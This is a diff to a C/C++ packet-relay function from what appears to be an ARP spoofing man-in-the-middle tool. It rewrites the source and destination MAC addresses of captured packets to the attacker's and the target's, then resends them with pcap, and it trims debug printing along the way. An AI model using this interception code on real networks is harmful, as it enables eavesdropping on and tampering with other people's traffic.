@@ -277,8 +277,9 @@ void Manage_Session(char** argv, char** smac, char** tmac, char* attack_ip, char
                 bool isCorrect2 = false;
                 IP_header ih;
                 tmp2 = ih.Print_IP(packet);
-                isCorrect2 = ih.Check_IP(packet, argv[cnt_session], argv[cnt_session+1], attack_ip);
+                isCorrect2 = ih.Check_IP(packet, argv[cnt_session], argv[cnt_session+1]);
                 if(isCorrect2 == true){
+                    printf("\n< Before Relay Packet Info >\n");
                     if(tmp2 == NULL){
                         printf("{ IP version is not IPv4 }\n");
                         return ;
@@ -311,24 +312,19 @@ void Manage_Session(char** argv, char** smac, char** tmac, char* attack_ip, char
                     // Relay
                     // change sender mac address to my mac address
                     packet -= 34;
-                    printf("\n< Before Relay Packet Info >\n");
                     struct ARP_header* Ah = (struct ARP_header*)(packet);
-                    Print_ARP(Ah);
-
                     tomar_mac_addr(Ah->src_mac_addr, attack_mac);
                     tomar_mac_addr(Ah->Destination_mac_addr, tmac[i]);
                     struct libnet_ethernet_hdr* eh = (struct libnet_ethernet_hdr*)(packet); // ether_dhost, ether_shost / u_int8_t
                     memcpy(eh->ether_dhost,  Ah->Destination_mac_addr, sizeof(Ah->Destination_mac_addr));
                     memcpy(eh->ether_shost, Ah->src_mac_addr, sizeof(Ah->src_mac_addr));
 
-                    if(pcap_sendpacket(handle,  reinterpret_cast<u_char*>(eh), header->caplen) != 0){
+                    // reinterpret_cast<u_char*>(eh)
+                    if(pcap_sendpacket(handle, packet, header->caplen) != 0){
                         perror("{ send packet error }");
                     }
 
                     printf("\n< After Relay Packet Info >\n");
-                    struct ARP_header* aa = (struct ARP_header*)(packet);
-                    Print_ARP(aa);
-
                     packet += 14;
                     char* tmp22; // IP protocol type
                     IP_header ih2;
